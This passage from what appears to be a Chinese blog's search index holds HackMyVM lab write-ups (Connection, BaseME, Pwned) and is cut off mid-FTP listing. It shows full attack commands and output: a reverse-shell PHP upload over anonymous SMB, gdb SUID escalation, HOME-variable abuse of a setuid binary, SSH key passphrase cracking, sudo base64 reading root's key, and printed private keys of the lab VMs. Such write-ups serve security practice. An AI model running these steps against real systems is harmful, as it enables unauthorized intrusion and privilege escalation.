WHW7/ndcaZ4H8KVx0B\ntIqgmzCMjUmoIKTG53BExRiOrfT2NAzFrttvFoluRveEuYy4VTtEYQ+7uyku/NHAYDMK5T\nd/rSolVOnrmnMV/fHnWPdgAwj5kGqTI0TXLXazAAAAAwEAAQAAAQBhD7sthEFbAqtXEAi/\n+suu8frXSu9h9sPRL4GrKa5FUtTRviZFZWv4cf0QPwyJ7aGyGJNxGZd5aiLiZfwTvZsUiE\nUa47n1yGWSWMVaZ55ob3N/F9czHg0C18qWjcOh8YBrgGGnZn1r0n1uHovBevMghlsgy/2w\npmlMTtfdUo7JfEKbZmsz3auih2/64rmVp3r0YyGrvOpWuV7spnzPNAFUCjPTwgE2RpBVtk\nWeiQtF8IedoMqitUsJU9ephyYqvjRemEugkqkALBJt91yBBO6ilulD8Xv1RBsVHUttE/Jz\nbu4XlJXVeD10ooFofrsZd/9Ydz4fx49GwtjYnqsda0rBAAAAgGbx1tdwaTPYdEfuK1kBhu\n3ln3QHVx3ZkZ7tNQFxxEjYjIPUQcFFoNBQpIUNOhLCphB8agrhcke5+aq5z2nMdXUJ3DO6\n0boB4mWSMml6aGpW4AfcDFTybT6V8pwZcThS9FL3K2JmlZbgPlhkX5fyOmh14/i5ti7r9z\nHlBkwMfJJPAAAAgQDPt0ouxdkG1kDNhGbGuHSMAsPibivXEB7/wK7XHTwtQZ7cCQTVqbbs\ny6FqG0oSaSz4m2DfWSRZc30351lU4ZEoHJmlL8Ul6yvCjMOnzUzkhrIen131h/MStsQYtY\nOZgwwdcG2+N7MReMpbDA9FSHLtHoMLUcxShLSX3ccIoWxqAwAAAIEAzdgK1iwvZkOOtM08\nQPaLXRINjIKwVdmOk3Q7vFhFRoman0JeyUbEd0qlcXjFzo02MBlBadh+XlsDUqZSWo7gpp\nivFRbnEu2sy02CHilIJ6vXCQnuaflapCNG8MlG5CtpqfyVoYQ3N3d0PfOWLaB13fGeV/wN\n0x2HyroKtB+OeZEAAAANYWxleGlhQGhvbW1pZQECAwQFBg==\n-----END OPENSSH PRIVATE KEY-----\n~~~\n\næŠŠalexiaçš„id_rsaè¾“å‡ºäº†ï¼Œå°†è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶æ‹–ä¸‹æ¥æ”¾è¿›idaçœ‹çœ‹\n\n~~~\nint __fastcall main(int argc, const char **argv, const char **envp)\n{\n  setuid(0);\n  setgid(0);\n  system(\"cat $HOME/.ssh/id_rsa\");\n  return 0;\n\n~~~\n\nä»–æ˜¯æŸ¥çœ‹ç¯å¢ƒå˜é‡é‡ŒHOMEå˜é‡ä¸‹çš„.ssh/id_rsa,å¯ä»¥ä¿®æ”¹HOMEå˜é‡è¯»å–rootçš„id_rsa\n\n~~~\nalexia@MiWiFi-RA71-srv:~$ export HOME=/root\nalexia@MiWiFi-RA71-srv:/home/alexia$ env\nSHELL=/bin/bash\nPWD=/home/alexia\nLOGNAME=alexia\nXDG_SESSION_TYPE=tty\nHOME=/root\n~~~\n\nå†æ¬¡è¿è¡Œæ‹¿åˆ°rootçš„id_rsaï¼Œç™»å½•å³å¯\n","tags":["é¶æœº"],"categories":["HackMyVM"]},{"title":"HackmyVM-Connection","url":"/2025/01/22/HackmyVM-Connection/","content":"\n\n\n\n\n\n\n\n\n# ä¿¡æ¯æœé›†\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/script]\nâ””â”€# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    a4:a9:30:df:ef:44       (Unknown)\n192.168.31.77   08:00:27:2a:5f:aa       PCS Systemtechnik GmbH\n192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)\n192.168.31.187  a6:9b:e0:2d:30:9a       (Unknown: locally administered)\n192.168.31.85   7e:2c:58:df:4e:cb       (Unknown: locally administered)\n\n5 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.984 seconds (129.03 hosts/sec). 5 responded\n~~~\n\nipä¸º192.168.31.77ï¼Œnmapæ‰«æç«¯å£\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/script]\nâ””â”€# nmap 192.168.31.77 --min-rate=1000 -p-\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 09:09 EST\nNmap scan report for connection (192.168.31.77)\nHost is up (0.00064s latency).\nNot shown: 65531 closed tcp ports (reset)\nPORT    STATE SERVICE\n22/tcp  open  ssh\n80/tcp  open  http\n139/tcp open  netbios-ssn\n445/tcp open  microsoft-ds\nMAC Address: 08:00:27:2A:5F:AA (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 11.11 seconds\n~~~\n\n# 445ç«¯å£\n\nå¼€å¯äº†445ç«¯å£\n\nç”¨enum4linuxè¿›è¡Œæšä¸¾\n\n~~~\n =================================( Share Enumeration on 192.168.31.77 )=================================\n\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        share           Disk\n        print$          Disk      Printer Drivers\n        IPC$            IPC       IPC Service (Private Share for uploading files)\nReconnecting with SMB1 for workgroup listing.\n\n        Server               Comment\n        ---------            -------\n\n        Workgroup            Master\n        ---------            -------\n        WORKGROUP            CONNECTION\n\n[+] Attempting to map shares on 192.168.31.77\n\n//192.168.31.77/share   Mapping: OK Listing: OK Writing: N/A\n//192.168.31.77/print$  Mapping: DENIED Listing: N/A Writing: N/A\n\n[E] Can't understand response:\n\nNT_STATUS_OBJECT_NAME_NOT_FOUND listing \\*\n//192.168.31.77/IPC$    Mapping: N/A Listing: N/A Writing: N/A\n~~~\n\nsmbclintå¯ä»¥åŒ¿åç™»é™†shareé‡Œæœ‰ä¸€ä¸ªhtmlï¼Œéšä¾¿å¾€é‡Œä¼ ä¸€ä¸ªæ–‡ä»¶å‘ç°åœ¨80ç«¯å£è®¿é—®åˆ°ï¼Œä¼ ä¸€ä¸ªåå¼¹shellçš„phpæ–‡ä»¶\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/script]\nâ””â”€# smbclient  //192.168.31.77/share\nPassword for [WORKGROUP\\root]:\nAnonymous login successful\nsmb: \\> cd html\\\nsmb: \\html\\>\nsmb: \\html\\> put rev.php\nputting file rev.php as \\html\\rev.php (447.0 kb/s) (average 447.0 kb/s)\nsmb: \\html\\> exit\n~~~\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/script]\nâ””â”€# nc -lvnp 5555\nlistening on [any] 5555 ...\nconnect to [192.168.31.129] from (UNKNOWN) [192.168.31.77] 45632\nLinux connection 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux\n 09:12:44 up 4 min,  0 users,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n/bin/sh: 0: can't access tty; job control turned off\n$\n~~~\n\næ¥æ”¶åˆ°shelläº†\n\n# ææƒ\n\nç”¨pythonè·å¾—ä¸€ä¸ªæ›´å¥½çš„ç»ˆç«¯\n\n~~~\n$  python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nwww-data@connection:/$\n~~~\n\næŸ¥æ‰¾suidæ–‡ä»¶\n\n~~~\nwww-data@connection:/$ find / -perm -u=s 2>/dev/null\nfind / -perm -u=s 2>/dev/null\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/bin/newgrp\n/usr/bin/umount\n/usr/bin/su\n/usr/bin/passwd\n/usr/bin/gdb\n/usr/bin/chsh\n/usr/bin/chfn\n/usr/bin/mount\n/usr/bin/gpassw\n~~~\n\nå¯ä»¥åˆ©ç”¨gdbè¿›è¡Œsuidææƒ\n\nhttps://gtfobins.github.io/gtfobins/gdb/\n\n~~~\nwww-data@connection:/$ gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit\n<mport os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit\nGNU gdb (Debian 8.2.1-2+b3) 8.2.1\nCopyright (C) 2018 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.\nType \"show copying\" and \"show warranty\" for details.\nThis GDB was configured as \"x86_64-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n<http://www.gnu.org/software/gdb/bugs/>.\nFind the GDB manual and other documentation resources online at:\n    <http://www.gnu.org/software/gdb/documentation/>.\n\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\".\n# id\nid\nuid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)\n~~~\n\nå‘ç°è¿›åˆ°rootç»„é‡Œäº†ï¼Œææƒç»“æŸ\n","tags":["é¶æœº"],"categories":["HackMyVM"]},{"title":"HackmyVM-BaseME","url":"/2025/01/22/HackmyVM-BaseME/","content":"\n\n\n\n\n# ä¿¡æ¯æœé›†\n\narp-scan -l \n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    a4:a9:30:df:ef:44       (Unknown)\n192.168.31.85   7e:2c:58:df:4e:cb       (Unknown: locally administered)\n192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)\n192.168.31.232  08:00:27:d9:d3:0c       PCS Systemtechnik GmbH\n\n4 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.973 seconds (129.75 hosts/sec). 4 responded\n~~~\n\nipä¸º192.168.31.220ï¼Œnmapæ‰«æç«¯å£\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# nmap 192.168.31.232 --min-rate=1000 -p-\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 08:13 EST\nNmap scan report for baseme (192.168.31.232)\nHost is up (0.0065s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:D9:D3:0C (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 21.46 seconds\n~~~\n\n# 80ç«¯å£\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# curl 192.168.31.232\nQUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK\n\n<!--\niloveyou\nyouloveyou\nshelovesyou\nhelovesyou\nweloveyou\ntheyhatesme\n-->\n~~~\n\nç»™äº†ä¸€ä¸²base64å’Œå‡ ä¸ªå­—ç¬¦ä¸²\n\nbase64è§£ç å†…å®¹ä¸ºï¼š\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# echo \"QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK\"|base64 -d\nALL, absolutely ALL that you need is in BASE64.\nIncluding the password that you need :)\nRemember, BASE64 has the answer to all your questions.\n-lucas\n~~~\n\nå¯ä»¥çŸ¥é“ç”¨æˆ·åä¸ºlucasï¼Œå¹¶ä¸”æ‰€æœ‰å†…å®¹éƒ½è¦è¿›è¡Œbase64ã€‚\n\nå°†å­—å…¸è¿›è¡Œbase64ç¼–ç ï¼Œç„¶åæ‰«æç›®å½•\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# cat /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt|while read line;do for i in $line;echo $i|base64 >>1;done\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# gobuster dir -u \"http://192.168.31.232\" -w ./1\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.31.232\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                ./1\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/aWRfcnNhCg==         (Status: 200) [Size: 2537]\n/cm9ib3RzLnR4dAo=     (Status: 200) [Size: 25]\nProgress: 4736 / 4737 (99.98%)\n===============================================================\nFinished\n===============================================================\n~~~\n\nè¿™ä¸¤ä¸ªæ–‡ä»¶åˆ†åˆ«æ˜¯id_rsaå’Œrobots.txt\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# echo \"aWRfcnNhCg==\"|base64 -d\nid_rsa\n\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# echo \"cm9ib3RzLnR4dAo=\"|base64 -d\nrobots.txt\n~~~\n\nrobots.txté‡Œä»€ä¹ˆä¹Ÿæ²¡æœ‰\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# base64 cm9ib3RzLnR4dAo= -d\nNothing here :(\n\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# base64 aWRfcnNhCg=\\= -d\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBTxe8YUL\nBtzfftAdPgp8YZAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCZCXvEPnO1\ncbhxqctBEcBDZjqrFfolwVKmpBgY07M3CK7pO10UgBsLyYwAzJEw4e6YgPNSyCDWFaNTKG\n07jgcgrggre8ePCMNFBCAGaYHmLrFIsKDCLI4NE54t58IUHeXCZz72xTobL/ptLk26RBnh\n7bHG1JjGlxOkO6m+1oFNLtNuD2QPl8sbZtEzX4S9nNZ/dpyRpMfmB73rN3yyIylevVDEyv\nf7CZ7oRO46uDgFPy5VzkndCeJF2YtZBXf5gjc2fajMXvq+b8ol8RZZ6jHXAhiblBXwpAm4\nvLYfxzI27BZFnoteBnbdzwSL5apBF5gYWJAHKj/J6MhDj1GKAFc1AAAD0N9UDTcUxwMt5X\nYFIZK8ieBL0NOuwocdgbUuktC21SdnSy6ocW3imM+3mzWjPdoBK/Ho339uPmBWI5sbMrpK\nxkZMnl+rcTbgz4swv8gNuKhUc7wTgtrNX+PNMdIALNpsxYLt/l56GK8R4J8fLIU5+MojRs\n+1NrYs8J4rnO1qWNoJRZoDlAaYqBV95cXoAEkwUHVustfgxUtrYKp+YPFIgx8okMjJgnbi\nNNW3TzxluNi5oUhalH2DJ2khKDGQUi9ROFcsEXeJXt3lgpZZt1hrQDA1o8jTXeS4+dW7nZ\nzjf3p0M77b/NvcZE+oXYQ1g5Xp1QSOSbj+tlmw54L7Eqb1UhZgnQ7ZsKCoaY9SuAcqm3E0\nIJh+I+Zv1egSMS/DOHIxO3psQkciLjkpa+GtwQMl1ZAJHQaB6q70JJcBCfVsykdY52LKDI\npxZYpLZmyDx8TTaA8JOmvGpfNZkMU4I0i5/ZT65SRFJ1NlBCNwcwtOl9k4PW5LVxNsGRCJ\nMJr8k5Ac0CX03fXESpmsUUVS+/Dj/hntHw89dO8HcqqIUEpeEbfTWLvax0CiSh3KjSceJp\n+8gUyDGvCkcyVneUQjmmrRswRhTNxxKRBZsekGwHpo8hDYbUEFZqzzLAQbBIAdrl1tt7mV\ntVBrmpM6CwJdzYEl21FaK8jvdyCwPr5HUgtuxrSpLvndcnwPaxJWGi4P471DDZeRYDGcWh\ni6bICrLQgeJlHaEUmrQC5Rdv03zwI9U8DXUZ/OHb40PL8MXqBtU/b6CEU9JuzJpBrKZ+k+\ntSn7hr8hppT2tUSxDvC+USMmw/WDfakjfHpoNwh7Pt5i0cwwpkXFQxJPvR0bLxvXZn+3xw\nN7bw45FhBZCsHCAbV2+hVsP0lyxCQOj7yGkBja87S1e0q6WZjjB4SprenHkO7tg5Q0HsuM\nAif/02HHzWG+CR/IGlFsNtq1vylt2x+Y/091vCkROBDawjHz/8ogy2Fzg8JYTeoLkHwDGQ\nO+TowA10RATek6ZEIxh6SmtDG/V5zeWCuEmK4sRT3q1FSvpB1/H+FxsGCoPIg8FzciGCh2\nTLuskcXiagns9N1RLOnlHhiZd8RZA0Zg7oZIaBvaZnhZYGycpAJpWKebjrtokLYuMfXRLl\n3/SAeUl72EA3m1DInxsPguFuk00roMc77N6erY7tjOZLVYPoSiygDR1A7f3zYz+0iFI4rL\nND8ikgmQvF6hrwwJBrp/0xKEaMTCKLvyyZ3eDSdBDPrkThhFwrPpI6+Ex8RvcWI6bTJAWJ\nLdmmRXUS/DtO+69/aidvxGAYob+1M=\n-----END OPENSSH PRIVATE KEY-----\n~~~\n\n80ç«¯å£ç»™äº†å‡ ä¸ªå­—ç¬¦ä¸²å°±æ˜¯å­—å…¸ï¼Œbase64ç¼–ç åçˆ†ç ´id_rsaçš„å¯†ç \n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# cat 1|while read line;do for i in $line;echo $i|base64 >>1;done\n\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# cat 1\niloveyou\nyouloveyou\nshelovesyou\nhelovesyou\nweloveyou\ntheyhatesme\naWxvdmV5b3UK\neW91bG92ZXlvdQo=\nc2hlbG92ZXN5b3UK\naGVsb3Zlc3lvdQo=\nd2Vsb3ZleW91Cg==\ndGhleWhhdGVzbWUK\n~~~\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# ssh2john id_rsa>1\n\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# john 1 -w=1\nUsing default input encoding: UTF-8\nLoaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])\nNo password hashes left to crack (see FAQ)\n\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# john 1 -w=1 --show\nInvalid options combination: \"--show\"\n\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# john 1  --show\nid_rsa:aWxvdmV5b3UK\n\n1 password hash cracked, 0 left\n~~~\n\nlucasç”¨æˆ·çš„å¯†ç å°±æ˜¯aWxvdmV5b3UK\n\n# ææƒ\n\nsshç™»å½•æ‹¿åˆ°user.txt\n\nsudo -lå¯ä»¥æ— å¯†ç è¿è¡Œbase64ï¼Œç›´æ¥è¯»å–/root/root.txt\n\n~~~\nlucas@MiWiFi-RA71-srv:~$ sudo -u root base64 /root/root.txt|base64 -d\nsudo: unable to resolve host MiWiFi-RA71-srv: No address associated with hostname\n                                   .     **\n                                *           *.\n                                              ,*\n                                                 *,\n                         ,                         ,*\n                      .,                              *,\n                    /                                    *\n                 ,*                                        *,\n               /.                                            .*.\n             *                                                  **\n             ,*                                               ,*\n                **                                          *.\n                   **                                    **.\n                     ,*                                **\n                        *,                          ,*\n                           *                      **\n                             *,                .*\n                                *.           **\n                                  **      ,*,\n                                     ** *,\n\nHMVFKBS64\n~~~\n\næƒ³ææƒåˆ°rootçš„è¯éœ€è¦è¯»å–id_rsa\n\n~~~\nlucas@MiWiFi-RA71-srv:~$ sudo -u root base64 /root/.ssh/id_rsa|base64 -d\nsudo: unable to resolve host MiWiFi-RA71-srv: No address associated with hostname\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAw6MgMnxUy+W9oem0Uhr2cJiez37qVubRK9D4kdu7H5NQ/Z0FFp2B\nIdV3wx9xDWAICJgtYQUvOV7KFNAWvEXTDdhBwdiUcWEJ4AOXK7+5v7x4b8vuG5zK0lTVxp\nDEBE8faPj3UaHsa1JUVaDngTIkCa6VBICvG0DCcfL8xHBpCSIfoHfpqmOpWT/pWXvGI3tk\n/Ku/STY7Ay8HtSgoqCcf3F+lb9J9kwKhFg9eLO5QDuFujb1CN7gUy8xhgNanUViyCZRwn7\npx+DfU+nscSEfG1zgfgqn2hCbBYqaP0jBgWcVL6YoMiwCS3jhmeFG4C/p51j3gI6b8yz9a\nS+DtdTpDwQAAA8D82/wZ/Nv8GQAAAAdzc2gtcnNhAAABAQDDoyAyfFTL5b2h6bRSGvZwmJ\n7PfupW5tEr0PiR27sfk1D9nQUWnYEh1XfDH3ENYAgImC1hBS85XsoU0Ba8RdMN2EHB2JRx\nYQngA5crv7m/vHhvy+4bnMrSVNXGkMQETx9o+PdRoexrUlRVoOeBMiQJrpUEgK8bQMJx8v\nzEcGkJIh+gd+mqY6lZP+lZe8Yje2T8q79JNjsDLwe1KCioJx/cX6Vv0n2TAqEWD14s7lAO\n4W6NvUI3uBTLzGGA1qdRWLIJlHCfunH4N9T6exxIR8bXOB+CqfaEJsFipo/SMGBZxUvpig\nyLAJLeOGZ4UbgL+nnWPeAjpvzLP1pL4O11OkPBAAAAAwEAAQAAAQBIArRoQOGJh9AMWBS6\noBgUC+lw4Ptq710Q7sOAFMxE7BnEsFZeI62TgZqqpNkdHjr2xuT1ME5YpK5niMzFkkIEd5\nSEwK6rKRfUcB3lyZWaoMoIBJ1pZoY1c2qYw1KTb3hVUEbgsmRugIhwWGC+anFfavaJCMDr\nnCO2g8VMnT/cTyAv/Qmi8m868KNEzcuzGV5ozHl1XLffHM9R/cqPPyAYaQIa9Z+kS6ou9R\niMTjTSxOPnfh286kgx0ry1se9BBlrEc5251R/PRkEKYrMj3AIwI30qvYlAtNfcCFhoJXLq\nvWystPARwiUs7WYBUHRf6bPP/pHTTvwwb2bs51ngImpdAAAAgDaWnQ7Lj7Vp+mTjhSu4oG\nptDHNd2uuqB1+CHRcaVutUmknxvxG3p957UbvNp6e0+ePKtAIakrzbpAo6u25poyWugAuz\nX2nQhqsQh6yrThDJlTiDMeV7JNGFbGOcanXXXHt3tjfyrS0+aM87WmwqNyh6nfgy1C5axR\nfKZG8ivz5iAAAAgQD83QmCIcbZaCOlGwgHGcuCUDcxGY1QlIRnbM5VAjimNezGFs9f0ExD\nSiTwFsmITP//njsbRZP2laiKKO6j4yp5LpfgDB5QHs+g4nXvDn6ns64gCKo7tf2bPP8VCe\nFWyc2JyqREwE3WmyhkPlyr9xAZerZ+7Fz+NFueRYzDklWg8wAAAIEAxhBeLqbo6/GUKXF5\nrFRatLXI43Jrd9pyvLx62KghsnEBEk7my9sbU5dvYBLztS+lfPCRxV2ZzpjYdN4SDJbXIR\ntxBaLJe3c4uIc9WjyxGwUK9IL65rSrRVERHsTO525ofPWGQEa2A+pRCpz3A4Y41fy8Y9an\n2B2NmfTAfEkWFXsAAAALcm9vdEBiYXNlbWU=\n-----END OPENSSH PRIVATE KEY-----\n~~~\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# ssh root@192.168.31.232 -i id_rsa\nLinux MiWiFi-RA71-srv 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Wed Jan 22 08:08:11 2025 from 192.168.31.129\nroot@MiWiFi-RA71-srv:~#\n~~~\n\n# æ€»ç»“\n\nåœ¨å¤„ç†å­—å…¸çš„æ—¶å€™è¿˜å¯ä»¥æœ‰æ›´é«˜æ•ˆçš„æ–¹æ³•ï¼Œå…¶ä»–çš„å°±æ²¡å•¥äº†\n","tags":["é¶æœº"],"categories":["HackMyVM"]},{"title":"HackmyVM-Pwned","url":"/2025/01/22/HackmyVM-Pwned/","content":"\n\n\n\n\n\n\n# ä¿¡æ¯æœé›†\n\narp-scan -læ‰«æip\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    a4:a9:30:df:ef:44       (Unknown)\n192.168.31.51   08:00:27:c4:72:27       PCS Systemtechnik GmbH\n192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)\n192.168.31.187  a6:9b:e0:2d:30:9a       (Unknown: locally administered)\n192.168.31.85   7e:2c:58:df:4e:cb       (Unknown: locally administered)\n\n5 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.986 seconds (128.90 hosts/sec). 5 responded\n~~~\n\nipä¸º192.168.31.51ï¼Œç„¶ånmapæ‰«æå¼€æ”¾ç«¯å£\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# nmap 192.168.31.51 --min-rate=1000 -p-\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 01:21 EST\nNmap scan report for pwned (192.168.31.51)\nHost is up (0.00019s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT   STATE SERVICE\n21/tcp open  ftp\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:C4:72:27 (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 13.85 seconds\n~~~\n\nå¼€æ”¾äº†21,22,80ç«¯å£\n\n# 80ç«¯å£\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# gobuster dir -u \"http://192.168.31.51\" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.31.51\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/nothing              (Status: 301) [Size: 316] [--> http://192.168.31.51/nothing/]\n/server-status        (Status: 403) [Size: 278]\n/hidden_text          (Status: 301) [Size: 320] [--> http://192.168.31.51/hidden_text/]\nProgress: 220559 / 220560 (100.00%)\n===============================================================\nFinished\n===============================================================\n~~~\n\n/nothing:\n\n~~~\ni said nothing bro\n~~~\n\n/hidden_text:\n\n~~~\n/hacked\n/vanakam_nanba\n/hackerman.gif \n/facebook\n/whatsapp\n/instagram\n/pwned\n/pwned.com\n/pubg \n/cod\n/fortnite\n/youtube\n/kali.org\n/hacked.vuln\n/users.vuln\n/passwd.vuln\n/pwned.vuln\n/backup.vuln\n/.ssh\n/root\n/home\n~~~\n\nåˆ©ç”¨ç»™çš„ç›®å½•æ‰«æ\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# gobuster dir -u \"http://192.168.31.51\" -w ./secret.dic\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.31.51\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                ./secret.dic\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/pwned.vuln           (Status: 301) [Size: 319] [--> http://192.168.31.51/pwned.vuln/]\nProgress: 22 / 23 (95.65%)\n===============================================================\nFinished\n===============================================================\n~~~\n\nå‰ç«¯ç»™äº†æºç \n\n~~~\n<?php\n//\tif (isset($_POST['submit'])) {\n//\t\t$un=$_POST['username'];\n//\t\t$pw=$_POST['password'];\n//\n//\tif ($un=='ftpuser' && $pw=='B0ss_B!TcH') {\n//\t\techo \"welcome\"\n//\t\texit();\n// }\n// else \n//\techo \"Invalid creds\"\n// }\n?>\n\n~~~\n\nè¿™æ˜¯ftpçš„è´¦å·ç„¶åç™»å½•ftp\n\n# 21ç«¯å£\n\n~~~\nftp> ls -la\n229 Entering Extended Passive Mode (|||48619|)\n150 Here comes the directory listing.\ndrwxrwxrwx    3 0        0            4096 Jul 09  2020 .\ndrwxr-xr-x    5 0        0            4096 Jul 10  2020 ..\ndrwxr-xr-x    2 0        0    